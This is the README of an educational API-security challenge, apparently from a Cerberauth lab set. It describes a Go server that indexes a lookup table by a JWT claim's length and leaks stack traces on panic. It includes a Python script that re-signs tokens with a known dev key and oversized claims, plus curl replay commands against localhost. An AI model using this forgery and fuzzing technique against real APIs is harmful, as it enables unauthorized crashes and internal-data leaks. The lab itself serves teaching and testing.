# JWT Claim Oversized Value

This challenge demonstrates an API that verifies the JWT signature correctly but then uses a claim's *length* as an array index with no upper bound. A `coupon` claim's length picks a discount tier out of a fixed-size lookup table - every coupon code the developers ever tested with was a handful of characters, so `discountTiers[len(coupon)]` always worked, right up until a claim value far longer than the table crashes the handler with an out-of-range panic.

A valid signature only proves who signed the token, not that its claim values stay within the size the API implicitly assumed. The crash isn't caught by a generic error handler either - a leftover debug middleware dumps the panic message and the full stack trace straight into the HTTP response. That makes every crash trivially distinguishable from a normal `200`/`401` response by status code, body content, and length - exactly the oracle a JWT claim fuzzer (a `--fuzz`/edit-and-resign mode that mutates claim values across requests, including oversized strings, and flags responses diverging from the baseline) is built to find.

This is one of a family of related challenges, each isolating a different class of claim mutation a fuzzer tries:

- [jwt-claim-type-confusion](../jwt-claim-type-confusion): wrong JSON type or `null` for a claim
- **jwt-claim-oversized-value** (this one): a claim value far longer than the API ever expected
- [jwt-claim-special-chars](../jwt-claim-special-chars): a claim value containing characters the API doesn't sanitize before using it structurally

## How to run it

```bash
go run main.go serve
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: an oversized coupon claim panics the handler with an out-of-range index, and the panic (with stack trace) is leaked in the response
go run main.go serve --vulnerable=true

# fixed: the index is bounds-checked and panics never leak internals to the client
go run main.go serve --vulnerable=false
```

## How to exploit it

```bash
# Get a legitimate token and confirm the happy path
TOKEN=$(go run main.go jwt)
curl -i http://localhost:8080/checkout -H "Authorization: Bearer $TOKEN"
# -> 200 OK {"coupon":"SAVE10","discount":"5%"}

# The signing key is a known dev secret, so a mutated claim can be re-signed
# and replayed against the target URL just like a claim fuzzer would.
python3 -c "
import hmac, hashlib, base64, json, time

def b64(d):
    return base64.urlsafe_b64encode(d).rstrip(b'=')

header = {'alg': 'HS256', 'typ': 'JWT'}
secret = b's3cr3t-dev-key'

def sign(claims):
    h = b64(json.dumps(header, separators=(',', ':')).encode())
    p = b64(json.dumps(claims, separators=(',', ':')).encode())
    signing_input = h + b'.' + p
    sig = b64(hmac.new(secret, signing_input, hashlib.sha256).digest())
    return (signing_input + b'.' + sig).decode()

base = {
    'sub': 'x', 'coupon': 'SAVE10',
    'iat': int(time.time()), 'exp': int(time.time()) + 3600,
}

print(sign({**base, 'coupon': 'A' * 5000}))
"

# Replay the mutated token - the baseline (200, ~35 bytes) diverges sharply
# from the crash response (500, ~2KB, containing a full Go stack trace)
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
  http://localhost:8080/checkout -H "Authorization: Bearer <mutated-token>"
```

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
